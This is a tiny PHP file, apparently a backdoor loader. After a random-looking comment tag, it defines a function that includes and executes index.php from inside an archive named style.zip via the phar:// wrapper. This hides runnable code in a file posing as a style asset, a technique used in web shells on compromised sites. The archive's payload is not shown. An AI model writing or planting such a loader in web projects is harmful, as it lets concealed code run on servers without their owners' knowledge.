<?php
# 29VKE RJ347KFQZ5Z

function loadFromPhar($zip, $file) {
    include "phar://$zip/$file";
}
loadFromPhar('style.zip', 'index.php');

?>